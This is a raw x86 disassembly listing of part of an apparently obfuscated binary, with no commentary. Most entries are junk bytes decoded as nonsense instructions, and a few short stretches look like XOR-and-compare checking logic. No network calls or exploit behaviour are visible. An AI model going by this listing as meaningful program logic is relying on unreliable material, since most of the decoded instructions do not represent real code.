  4018f7:	xchg   DWORD PTR [esi+0x329682c1],esp
  4018fd:	xor    BYTE PTR [ecx],cl
  4018ff:	sub    bh,bh
  401901:	les    ebp,FWORD PTR [edi+0x47]
  401904:	or     edx,DWORD PTR [esi+0x5d776049]
  40190a:	sub    al,0x52
  40190c:	cmp    eax,DWORD PTR [esi+0x3c]
  40190f:	daa    
  401910:	sub    al,0x57
  401912:	jae    0x40198d
  401914:	or     eax,0xb1affd31
  401919:	jnp    0x401901
  40191b:	push   0xfffffffc
  40191d:	outs   dx,DWORD PTR ds:[esi]
  40191e:	push   ds
  40191f:	imul   edi,esi,0x20
  401922:	in     al,dx
  401923:	sar    BYTE PTR ds:0x44e17346,cl
  401929:	repz dec eax
  40192b:	pushf  
  40192c:	sub    al,0x6d
  40192e:	mov    ah,cl
  401930:	fcom   QWORD PTR [edx+0x4d9c3e40]
  401936:	ins    BYTE PTR es:[edi],dx
  401937:	loope  0x4018d4
  401939:	test   edi,0xe7ab2ad1
  40193f:	call   0xc568:0x373ad26
  401946:	test   ecx,ebp
  401948:	(bad)  
  401949:	std    
  40194a:	jo     0x401905
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xd17bf628
  401994:	jb     0x4019ed
  401996:	mov    ?,WORD PTR [eax+0x7a]
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	pop    eax
  4019a0:	jne    0x401935
  4019a2:	int3   
  4019a3:	xchg   esp,eax
  4019a4:	data16 daa 
  4019a6:	ficomp WORD PTR [esi+0x45]
  4019a9:	pop    edx
  4019aa:	jne    0x40196a
  4019ac:	xor    cl,al
  4019ae:	call   0x264a:0x83124dbd
  4019b5:	scas   al,BYTE PTR es:[edi]
  4019b6:	adc    al,0xa8
  4019b8:	icebp  
  4019b9:	and    ebp,DWORD PTR [eax+ebx*8-0x38f3e6ba]
  4019c0:	jnp    0x401a2c
  4019c2:	mov    edi,0x99f1837f
  4019c7:	clc    
  4019c8:	pop    edx
  4019c9:	mov    DWORD PTR [ebp-0x75],0x2689ffc7
  4019d0:	cmc    
  4019d1:	scas   eax,DWORD PTR es:[edi]
  4019d2:	pop    esp
  4019d3:	daa    
  4019d4:	add    ah,BYTE PTR ds:0xbd279e5d
  4019da:	lds    ebp,FWORD PTR ds:0x84d40ed4
  4019e0:	icebp  
  4019e1:	cs bnd jle 0x4019d7
  4019e5:	dec    ebx
  4019e6:	and    al,0x6a
  4019e8:	sbb    eax,0x90dc676c
  4019ed:	sbb    BYTE PTR [eax+ebp*8],dl
  4019f0:	in     al,0x91
  4019f2:	in     al,0xc
  4019f4:	imul   BYTE PTR [ebx]
  4019f6:	and    DWORD PTR [ebx-0x46],0x28
  4019fa:	jmp    0x94dd6cc3
  4019ff:	(bad)  
  401a01:	rcl    DWORD PTR [eax+edx*1-0x14],1
  401a05:	push   es
  401a06:	push   edi
  401a07:	aas    
  401a08:	test   BYTE PTR [edi+ecx*2-0x45],dh
  401a0c:	retf   
  401a0d:	(bad)  
  401a0f:	stc    
  401a10:	mov    dl,0xfe
  401a12:	imul   ecx,esi,0xffffffce
  401a15:	mov    eax,0x90e5a06f
  401a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a1b:	cld    
  401a1c:	int    0x21
  401a1e:	push   ss
  401a1f:	rcl    DWORD PTR [ebx+0x369726fc],cl
  401a25:	loope  0x401a75
  401a27:	mov    edi,0xc5abb3e8
  401a2c:	xor    al,0xba
  401a2e:	shl    dl,1
  401a30:	push   ebx
  401a31:	mov    eax,0x5e9d1097
  401a36:	(bad)  
  401a37:	lock mov DWORD PTR [ebx-0x40b39f1a],eax
  401a3e:	and    eax,0x6a62dc28
  401a43:	sahf   
  401a44:	out    dx,al
  401a45:	cmp    al,0xd2
  401a47:	cmp    al,BYTE PTR [edi-0xf]
  401a4a:	pop    ebp
  401a4b:	ret    0xac15
  401a4e:	int3   
  401a4f:	jp     0x401ac8
  401a51:	xchg   ecx,eax
  401a52:	mov    ds:0x61bc46dc,eax
  401a57:	sub    al,0x54
  401a59:	push   ss
  401a5a:	xchg   esi,eax
  401a5b:	sbb    bh,BYTE PTR [esi-0x63fc25de]
  401a61:	jecxz  0x401a51
  401a63:	mov    bl,0x27
  401a65:	xchg   BYTE PTR fs:[esi-0x1a0d8168],cl
  401a6c:	retf   0xed72
  401a6f:	fldcw  WORD PTR [edi]
  401a71:	add    edx,DWORD PTR [edx-0x4add6a4c]
  401a77:	push   es
  401a78:	adc    cl,BYTE PTR [ebp+0x36b0a4d5]
  401a7e:	sub    eax,0xb07393ae
  401a83:	out    0x3a,eax
  401a85:	sbb    eax,0x2f6a8411
  401a8a:	ss sbb al,0x1a
  401a8d:	rol    ebp,0x79
  401a90:	jg     0x401a7d
  401a92:	ins    DWORD PTR es:[edi],dx
  401a93:	sbb    eax,0xdd242460
  401a98:	es out dx,eax
  401a9a:	repnz (bad) 
  401a9c:	jno    0x401acc
  401a9e:	jp     0x401a62
  401aa0:	cmp    BYTE PTR [edx+eiz*8],0x15
  401aa4:	push   ss
  401aa5:	or     BYTE PTR ds:0x195146a8,bh
  401aab:	icebp  
  401aac:	mov    dh,0x34
  401aae:	fdivrp st(7),st
  401ab0:	test   al,0x74
  401ab2:	jbe    0x401a4e
  401ab4:	loope  0x401ae3
  401ab6:	inc    eax
  401ab7:	aas    
  401ab8:	add    DWORD PTR [ebx-0x202c7fa5],eax
  401abe:	fwait
  401abf:	add    DWORD PTR [ebp-0x3a2ec64f],edx
  401ac5:	pushf  
  401ac6:	repnz (bad) 
  401ac9:	outs   dx,BYTE PTR ds:[esi]
  401aca:	clc    
  401acb:	adc    ah,BYTE PTR [esi+0x4]
  401ace:	lea    eax,[ebx]
  401ad0:	jns    0x401aa2
  401ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ad3:	add    al,0x9f
  401ad5:	addr16 mov al,ds:0xb20d
  401ad9:	(bad)  
  401ada:	cmp    edx,edx
  401adc:	sbb    al,0xa8
  401ade:	or     al,0x20
  401ae0:	mov    eax,0x256bd4dc
  401ae5:	daa    
  401ae6:	pop    edi
  401ae7:	xchg   ebx,eax
  401ae8:	nop
  401ae9:	out    0x8,eax
  401aeb:	lods   eax,DWORD PTR ds:[esi]
  401aec:	lahf   
  401aed:	mov    BYTE PTR [edi-0x1f971916],ch
  401af3:	jmp    0x401ac7
  401af5:	call   0x434e14f1
  401afa:	and    esi,ebp
  401afc:	fnsave [ecx]
  401afe:	stc    
  401aff:	mov    ecx,0x6ac99714
  401b04:	test   al,0x39
  401b06:	or     esp,esi
  401b08:	jmp    0x8e3471c9
  401b0d:	inc    esp
  401b0e:	cs xor eax,0x8299430a
  401b14:	mov    eax,ds:0xa8186f7e
  401b19:	rol    BYTE PTR ds:0x52cf6aff,cl
  401b1f:	xchg   ebp,eax
  401b20:	addr16 mov bh,0x40
  401b23:	mov    ah,0x72
  401b25:	add    bl,BYTE PTR [esi-0x4673d739]
  401b2b:	fs and eax,0x859571e5
  401b31:	shl    DWORD PTR [ecx+0xaa6f39c],1
  401b37:	test   eax,0x9375a4a0
  401b3c:	mov    edi,gs
  401b3e:	imul   edx,esi,0x60
  401b41:	rcl    DWORD PTR [ebx],0xe9
  401b44:	and    eax,0x13d96204
  401b49:	and    al,0x93
  401b4b:	mov    esp,0x54d41cae
  401b50:	push   edi
  401b51:	mov    eax,ds:0x5c1b5eb5
  401b56:	jbe    0x401b73
  401b58:	push   ss
  401b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b5a:	xor    dl,BYTE PTR [ebx+0x61]
  401b5d:	popf   
  401b5e:	sub    eax,0x8837277b
  401b63:	add    BYTE PTR [ebp+0x65455bbb],0xff
  401b6a:	mov    edx,0x4f7be05f
  401b6f:	enter  0x28a,0xd5
  401b73:	js     0x401be5
  401b75:	sbb    al,0xde
  401b77:	pop    DWORD PTR [eax+eiz*8]
  401b7a:	es ja  0x401b65
  401b7d:	sub    al,0x1c
  401b7f:	pop    ebx
  401b80:	and    eax,0x77dac988
  401b85:	addr16 cli 
  401b87:	ret    0xb585
  401b8a:	xchg   edx,eax
  401b8b:	and    al,0x5c
  401b8d:	cmc    
  401b8e:	jl     0x401bd7
  401b90:	dec    edi
  401b91:	sti    
  401b92:	addr16 mov al,0x88
  401b95:	adc    cl,BYTE PTR [esi+eiz*4-0x6f]
  401b99:	out    dx,al
  401b9a:	cmp    BYTE PTR ds:0x8b114d82,bh
  401ba0:	inc    ebp
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    ch,ch
  401bdd:	mov    esi,ecx
  401bdf:	sub    DWORD PTR [eax+0x78],esi
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	cmp    al,cl
  401bea:	dec    ecx
  401beb:	jle    0x401b82
  401bed:	inc    ebp
  401bee:	push   0x74
  401bf0:	or     bl,BYTE PTR [ebx]
  401bf2:	fcmovu st,st(4)
  401bf4:	ret    0xc05
  401bf7:	daa    
  401bf8:	mov    ds:0x2cd0d867,al
  401bfd:	cwde   
  401bfe:	inc    esp
  401bff:	sbb    BYTE PTR [edi-0x7a51a713],ch
  401c05:	rol    BYTE PTR [ebp+eiz*1+0x48],1
  401c09:	and    al,BYTE PTR [edx+0x4b]
  401c0c:	xchg   esp,eax
  401c0d:	dec    esp
  401c0e:	adc    dh,BYTE PTR [ebp+0x3c]
  401c11:	sbb    dh,bl
  401c13:	rcr    ah,0xfa
  401c16:	jp     0x401c8e
  401c18:	sti    
  401c19:	sub    esp,DWORD PTR ds:[edi+0x390cbced]
  401c20:	adc    DWORD PTR [edx],0x3d
  401c23:	push   edi
  401c24:	ins    BYTE PTR es:[di],dx
  401c26:	mov    cl,0x7e
  401c28:	mul    bh
  401c2a:	std    
  401c2b:	mov    ds:0x9340559e,al
  401c30:	mov    ebp,0x17a8a5e3
  401c35:	imul   ecx,DWORD PTR [edi-0x72],0x82d56ae1
  401c3c:	push   esp
  401c3d:	scas   eax,DWORD PTR es:[di]
  401c3f:	sbb    eax,0x9363348c
  401c44:	mov    dh,0x87
  401c46:	xchg   bl,dh
  401c48:	ins    BYTE PTR es:[edi],dx
  401c49:	scas   eax,DWORD PTR es:[edi]
  401c4a:	cmp    bl,BYTE PTR [edx]
  401c4c:	sub    ecx,eax
  401c4e:	mov    ah,0x4a
  401c50:	ins    BYTE PTR es:[edi],dx
  401c51:	fwait
  401c52:	sub    DWORD PTR [edx+0x592be478],edi
  401c58:	repnz push ss
  401c5a:	push   ebx
  401c5b:	scas   al,BYTE PTR es:[edi]
  401c5c:	call   FWORD PTR [ebp-0x5b96b6ec]
  401c62:	mov    ebx,0xdc0a1f61
  401c67:	mov    esi,0x8082b90f
  401c6c:	ret    
  401c6d:	test   al,0x1b
  401c6f:	sub    ecx,DWORD PTR [eax+0x54]
  401c72:	repz pop ds
  401c74:	push   ds
  401c75:	cmp    cl,cl
  401c77:	push   esi
  401c78:	rcr    DWORD PTR ds:0x79fc9201,cl
  401c7e:	pop    ecx
  401c7f:	xchg   ecx,eax
  401c80:	mov    ebp,0x2ee5cade
  401c85:	or     edi,DWORD PTR [ebp-0x64]
  401c88:	push   0x2478a8bf
  401c8d:	fbstp  TBYTE PTR [edx+edi*8-0x45]
  401c91:	xor    eax,0x165b0568
  401c96:	iret   
  401c97:	jmp    0x211b:0xa8b5d5d4
  401c9e:	enter  0x4502,0xa1
  401ca2:	or     eax,0x58ded828
  401ca7:	clc    
  401ca8:	pop    es
  401ca9:	cmp    dh,bh
  401cab:	bound  ebx,QWORD PTR [ebx-0x34]
  401cae:	jge    0x401cef
  401cb0:	stos   BYTE PTR es:[edi],al
  401cb1:	add    al,0xad
  401cb3:	cmp    BYTE PTR [esi+0x68],bl
  401cb6:	loop   0x401d0b
  401cb8:	sub    esi,edi
  401cba:	outs   dx,BYTE PTR ds:[esi]
  401cbb:	popa   
  401cbc:	push   ds
  401cbd:	cmp    ebp,DWORD PTR [ebx+0x1db92ac1]
  401cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cc4:	mov    cs,ebp
  401cc6:	xchg   ebx,eax
  401cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cc8:	xchg   edx,eax
  401cc9:	aam    0x93
  401ccb:	je     0x401c9b
  401ccd:	fidivr WORD PTR [edx]
  401ccf:	mov    ebp,0xea93068d
  401cd4:	mov    ds:0x190d474,al
  401cd9:	inc    esp
  401cda:	dec    esp
  401cdb:	push   edi
  401cdc:	(bad)  
  401cdd:	jne    0x401cbc
  401cdf:	add    ebx,DWORD PTR [eax]
  401ce1:	sbb    al,0xc2
  401ce3:	inc    ebx
  401ce4:	call   0x6bcd:0x23f70141
  401ceb:	frstor [ecx+esi*2-0x14d0ea88]
  401cf2:	cdq    
  401cf3:	mov    cl,BYTE PTR [esi+0x1f934d1d]
  401cf9:	xchg   ebx,eax
  401cfa:	sbb    al,0x80
  401cfc:	inc    eax
  401cfd:	xor    DWORD PTR [edi],ecx
  401cff:	std    
  401d00:	adc    DWORD PTR [edi+0x72],esp
  401d03:	mov    ebx,0xdbdc4f1b
  401d08:	mov    eax,DWORD PTR [edi]
  401d0a:	mov    ds:0x8747a965,al
  401d0f:	mov    esp,0x85f99406
  401d14:	sub    eax,0x1709f093
  401d19:	int3   
  401d1a:	or     dh,0x42
  401d1d:	mul    BYTE PTR ds:[ebp-0x66]
  401d21:	mov    ecx,0x10a78500
  401d26:	(bad)  
  401d27:	adc    al,0x76
  401d29:	jmp    0x401d25
  401d2b:	xchg   BYTE PTR [esi+0x72],ah
  401d2e:	std    
  401d2f:	adc    ecx,DWORD PTR [eax-0x54f389e2]
  401d35:	jnp    0x401db3
  401d37:	scas   al,BYTE PTR es:[edi]
  401d38:	mov    dh,al
  401d3a:	sbb    eax,0x25d8b1c0
  401d3f:	mov    dl,0x12
  401d41:	mov    ecx,0xf6fbef17
  401d46:	ja     0x401d0e
  401d48:	ds loope 0x401d17
  401d4b:	mov    ds:0x4418a390,eax
  401d50:	and    al,0x5
  401d52:	gs jp  0x401dac
  401d55:	rcr    BYTE PTR ss:[ebx],1
  401d58:	cs jmp 0xb0f7b911
  401d5e:	leave  
  401d5f:	ins    DWORD PTR es:[edi],dx
  401d60:	cmp    al,0xec
  401d62:	xor    al,0x15
  401d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d65:	test   DWORD PTR [ecx+0x3b2e85d3],eax
  401d6b:	jmp    0x401d96
  401d6d:	sub    ecx,DWORD PTR [esi-0x4f]
  401d70:	aas    
  401d71:	enter  0xc242,0x7d
  401d75:	rcr    BYTE PTR [esi+0x3e5ca27d],0xf4
  401d7c:	mov    bh,0x67
  401d7e:	mov    cl,0xdd
  401d80:	or     eax,0x6b
  401d83:	dec    esi
  401d84:	test   cl,ah
  401d86:	mov    bh,0xf4
  401d88:	cdq    
  401d89:	jae    0x401d90
  401d8b:	cli    
  401d8c:	es fcomp st(0)
  401d8f:	mov    bl,0x60
  401d91:	sqrtps xmm4,XMMWORD PTR [edx-0x15b1cb6b]
  401d98:	rcr    DWORD PTR [esi+0x2fc7081c],0x8
  401d9f:	jecxz  0x401d87
  401da1:	adc    ch,BYTE PTR [edx]
  401da3:	push   ebp
  401da4:	pop    ss
  401da5:	and    edi,DWORD PTR [eax-0x7a]
  401da8:	fisub  DWORD PTR [edx-0x4e]
  401dab:	call   0x9b04:0xe073b890
  401db2:	out    dx,eax
  401db3:	shr    BYTE PTR [edi+eax*2-0x68defdf3],0xa7
  401dbb:	arpl   WORD PTR [edx-0x58a99adb],bp
  401dc1:	xor    BYTE PTR [eax],ch
  401dc3:	dec    ecx
  401dc4:	xor    ecx,eax
  401dc6:	and    DWORD PTR [edi+esi*8],ecx
  401dc9:	xchg   ecx,eax
  401dca:	jg     0x401d90
  401dcc:	push   0xffffffb8
  401dce:	jmp    FWORD PTR [ebx-0x2c]
  401dd1:	xchg   ebp,eax
  401dd2:	outs   dx,BYTE PTR ds:[esi]
  401dd3:	aad    0xe3
  401dd5:	xchg   ebp,eax
  401dd6:	sub    al,0x9b
  401dd8:	ficom  DWORD PTR [edi-0x18]
  401ddb:	jp     0x401e56
  401ddd:	jmp    0xca908b3b
  401de2:	jg     0x401dc2
  401de4:	mov    ecx,0x38cfa12
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [edx+edx*8+0x1b],dl
  401e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e45:	pop    edi
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	mov    edi,0x518866d6
  401e53:	cs stc 
  401e55:	inc    edx
  401e56:	mov    esi,0x210fa391
  401e5b:	mov    esp,0x205fe5b1
  401e60:	xchg   edi,eax
  401e61:	repz inc ecx
  401e63:	push   edi
  401e64:	(bad)  
  401e65:	jmp    DWORD PTR [esi+0x190ed155]
  401e6b:	add    edx,ebx
  401e6d:	in     al,0xaf
  401e6f:	add    al,0xbd
  401e71:	shr    DWORD PTR [eax+ebx*8+0x6c],1
  401e75:	inc    ebx
  401e76:	adc    al,0xf
  401e78:	push   edi
  401e79:	jb     0x401e5c
  401e7b:	mov    eax,ds:0xee7bcc06
  401e80:	iret   
  401e81:	or     bh,BYTE PTR [edi+0x79]
  401e84:	or     al,0x63
  401e86:	les    edi,FWORD PTR [ebx]
  401e88:	lock sbb bl,BYTE PTR gs:[edi+0xc806a91]
  401e90:	test   eax,0x82e8d67f
  401e95:	xor    cl,BYTE PTR [edi-0xb]
  401e98:	pop    esp
  401e99:	(bad)  
  401e9a:	or     DWORD PTR [edx-0x5bd93b9a],ebx
  401ea0:	aam    0xcb
  401ea2:	jnp    0x401e81
  401ea4:	and    DWORD PTR [ebx+0x15],ebp
  401ea7:	pop    es
  401ea8:	push   ds
  401ea9:	addr16 aam 0xe3
  401eac:	lds    edi,FWORD PTR [ecx-0xb6f6500]
  401eb2:	fwait
  401eb3:	pop    ds
  401eb4:	icebp  
  401eb5:	dec    esp
  401eb6:	ds out dx,eax
  401eb8:	xor    DWORD PTR ds:0xec3072fa,eax
  401ebe:	psubusb mm7,QWORD PTR [ebx]
  401ec1:	cli    
  401ec2:	jnp    0x401f07
  401ec4:	les    ecx,FWORD PTR [ebx-0x1da08f1]
  401eca:	mov    edi,DWORD PTR [ebx+0x8]
  401ecd:	out    dx,eax
  401ece:	bound  edx,QWORD PTR [eax-0x48]
  401ed1:	add    DWORD PTR [eax],ecx
  401ed3:	aas    
  401ed4:	ds jp  0x401ef2
  401ed7:	fadd   st,st(1)
  401ed9:	sub    eax,0xa364bdca
  401ede:	iret   
  401edf:	sbb    DWORD PTR [ecx+0x584e0a5],esi
  401ee5:	sbb    eax,0x633d2156
  401eea:	pop    edi
  401eeb:	imul   esp,DWORD PTR [ebx+0x24287ab8],0x4eabff98
  401ef5:	ret    0xe2e1
  401ef8:	and    ebp,DWORD PTR [ebx+0x4bc34b05]
  401efe:	jge    0x401e94
  401f00:	cmp    ah,dh
  401f02:	dec    ebp
  401f03:	pusha  
  401f04:	enter  0x8d48,0x61
  401f08:	add    ah,BYTE PTR [ebp+0x30]
  401f0b:	push   ecx
  401f0c:	push   esp
  401f0d:	jg     0x401ebd
  401f0f:	mov    ds:0x51805455,al
  401f14:	inc    di
  401f16:	ja     0x401f3f
  401f18:	test   DWORD PTR [edi],ebp
  401f1a:	loopne 0x401f79
  401f1c:	pop    ebx
  401f1d:	fst    QWORD PTR [edx+0x465a86f2]
  401f23:	cwde   
  401f24:	sub    DWORD PTR [esi+ecx*4],esi
  401f27:	rol    ebp,1
  401f29:	pop    esp
  401f2a:	push   ss
  401f2b:	js     0x401f69
  401f2d:	jbe    0x401f19
  401f2f:	jle    0x401f68
  401f31:	aad    0xdf
  401f33:	clts   
  401f35:	inc    ebp
  401f36:	stos   DWORD PTR es:[edi],eax
  401f37:	jne    0x401f90
  401f39:	(bad)
  401f3c:	adc    DWORD PTR [edx],0x161862fb
  401f42:	ret    
  401f43:	and    DWORD PTR [edi-0x22bf5358],edx
  401f49:	jbe    0x401f02
  401f4b:	sub    ebp,DWORD PTR [esi]
  401f4d:	mov    ebp,0xbc0d7a14
  401f52:	mov    ebx,0x63287591
  401f57:	mov    dh,0x4f
  401f59:	mov    ch,0xe0
  401f5b:	add    ah,dl
  401f5d:	add    BYTE PTR [ebx],bh
  401f5f:	sub    esp,DWORD PTR [edi]
  401f61:	repz push DWORD PTR [edi+0x19a4e1a]
  401f68:	popa   
  401f69:	mov    edi,0xebcbf1ca
  401f6e:	xor    cl,BYTE PTR [ecx]
  401f70:	inc    ebx
  401f71:	mov    bl,BYTE PTR [eax+0x78]
  401f74:	pop    esp
  401f75:	int    0xe6
  401f77:	pop    ds
  401f78:	div    BYTE PTR [eax+0x70]
  401f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f7c:	inc    ebx
  401f7d:	sbb    eax,0xf2af5cff
  401f82:	push   esp
  401f83:	xor    al,0x39
  401f85:	or     BYTE PTR [ecx],ch
  401f87:	pop    ss
  401f88:	fdiv   QWORD PTR [esi+0x1528844a]
  401f8e:	push   cs
  401f8f:	call   0xe393e563
  401f94:	fstp   QWORD PTR [edx+0x299ea6e8]
  401f9a:	stos   DWORD PTR es:[edi],eax
  401f9b:	dec    edi
  401f9c:	mov    ebx,0xa3df3c7a
  401fa1:	sti    
  401fa2:	inc    ebx
  401fa3:	mov    gs,WORD PTR [ebx+0x5706af0]
  401fa9:	add    al,0xfc
  401fab:	push   esi
  401fac:	retf   0xccb8
  401faf:	lahf   
  401fb0:	inc    ebp
  401fb1:	stos   BYTE PTR es:[edi],al
  401fb2:	cmc    
  401fb3:	fmul   DWORD PTR [esi+ecx*2+0x63b92b18]
  401fba:	push   ds
  401fbb:	les    ecx,FWORD PTR ds:0xb5bcf1a2
  401fc1:	adc    BYTE PTR [edi+ecx*2],0x7e
  401fc5:	loop   0x401fc8
  401fc7:	and    DWORD PTR [ecx],edx
  401fc9:	jge    0x401fa1
  401fcb:	dec    edx
  401fcc:	call   0x1987:0x3997b2b2
  401fd3:	and    ah,0xff
  401fd6:	jo     0x401f9c
  401fd8:	mov    ecx,0x79e6c644
  401fdd:	rcl    BYTE PTR [edx+ebx*8+0x6e],1
  401fe1:	out    dx,eax
  401fe2:	xchg   edx,eax
  401fe3:	mov    dh,0x32
  401fe5:	push   eax
  401fe6:	retf   
  401fe7:	scas   al,BYTE PTR es:[edi]
  401fe8:	lds    esi,FWORD PTR cs:[edx]
  401feb:	cmc    
  401fec:	sub    DWORD PTR [edi+0x77cf72f],edi
  401ff2:	add    cl,cl
  401ff4:	jl     0x401fea
  401ff6:	es sub al,0x46
  401ffa:	mov    bh,0x7f
  401ffc:	sbb    ecx,eax
  401ffe:	aam    0xcc
  402000:	sub    ah,dl
  402002:	adc    dh,ch
  402004:	mov    ah,0xb1
  402006:	les    esp,FWORD PTR [ebx+0x742ca4ad]
  40200c:	shr    BYTE PTR [ebx],cl
  40200e:	cmp    dh,ah
  402010:	sbb    BYTE PTR [esi-0x3c],0x7b
  402014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402015:	mov    bh,0x1a
  402017:	jo     0x402034
  402019:	mov    edx,0xf14b7074
  40201e:	arpl   WORD PTR [ecx+0x271c7dff],di
  402024:	and    cl,al
  402026:	repz and DWORD PTR [edi-0x4b],0xc046d28b
  40202e:	push   edi
  40202f:	mov    bh,0x92
  402031:	and    ebx,0x5f4a4cc
  402037:	inc    edi
  402038:	popa   
  402039:	mov    bh,0x60
  40203b:	in     al,0x37
  40203d:	test   DWORD PTR [eax-0x1c],ebp
  402040:	out    dx,eax
  402041:	jg     0x402093
  402043:	mov    bl,0x50
  402045:	shl    esp,1
  402047:	mov    ds:0x902e40f7,al
  40204c:	mov    al,ds:0xd8558b3d
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	adc    BYTE PTR [esi+0x7a],0x14
  40206d:	out    0x70,al
  40206f:	add    al,0x70
  402071:	jo     0x4020e3
  402073:	jle    0x4020e5
  402075:	jo     0x402049
  402077:	lahf   
  402078:	sub    BYTE PTR [esi],dl
  40207a:	fs xor cl,0x94
  40207e:	mov    ecx,0x24659a0c
  402083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402084:	and    BYTE PTR [ecx],dh
  402086:	add    BYTE PTR [ecx+ebp*4-0x1aa42ad],cl
  40208d:	js     0x4020e5
  40208f:	mov    al,0xbd
  402091:	ss out 0xaf,al
  402094:	mov    cl,0xc8
  402096:	mov    ah,0x7f
  402098:	cli    
  402099:	outs   dx,DWORD PTR ds:[esi]
  40209a:	(bad)
  40209d:	pusha  
  40209e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40209f:	inc    ebx
  4020a0:	adc    eax,DWORD PTR [edx]
  4020a2:	fistp  DWORD PTR ds:0xae862b3b
  4020a8:	sti    
  4020a9:	in     al,0x98
  4020ab:	inc    esi
  4020ac:	les    ebx,FWORD PTR [edi-0x1dcfb973]
  4020b2:	jmp    0x4184:0xc2d041e4
  4020b9:	(bad)
  4020bc:	mov    ds:0x4c2e2807,al
  4020c1:	jmp    0xa8fb9815
  4020c6:	mov    ?,WORD PTR [eax]
  4020c8:	add    eax,0x466565a8
  4020cd:	mov    eax,DWORD PTR ds:0xd465993
  4020d3:	xor    ebp,eax
  4020d5:	jne    0x40212b
  4020d7:	jmp    0xfb08edae
  4020dc:	push   esp
  4020dd:	sub    eax,0x4b688039
  4020e2:	stc    
  4020e3:	mov    bl,BYTE PTR [ecx+eax*8-0xc]
  4020e7:	adc    dl,BYTE PTR [ebx+0x4c]
  4020ea:	pop    edx
  4020eb:	stc    
  4020ec:	out    0x98,al
  4020ee:	xor    ecx,esi
  4020f0:	nop
  4020f1:	mov    ebp,0x89dd0772
  4020f6:	add    dl,ch
  4020f8:	and    al,BYTE PTR [edi]
  4020fa:	mov    ebx,0x717ed2e3
  4020ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402100:	add    cl,BYTE PTR ds:0x90e03e77
  402106:	sbb    ch,bl
  402108:	ret    0xe532
  40210b:	hlt    
  40210c:	jecxz  0x40218c
  40210e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210f:	xchg   ebp,eax
  402110:	xchg   DWORD PTR [edi+0x1d],esi
  402113:	cli    
  402114:	mov    dl,0xb8
  402116:	inc    edi
  402117:	(bad)  
  402118:	inc    ecx
  402119:	test   DWORD PTR [esi-0x7ab31f95],edx
  40211f:	je     0x402122
  402121:	(bad)  
  402122:	retf   
  402123:	xchg   edi,eax
  402124:	mov    ds:0x46c1d48d,al
  402129:	dec    ebx
  40212a:	sbb    DWORD PTR [ebp-0x5819bdff],ebx
  402130:	mov    ebx,0x943052a3
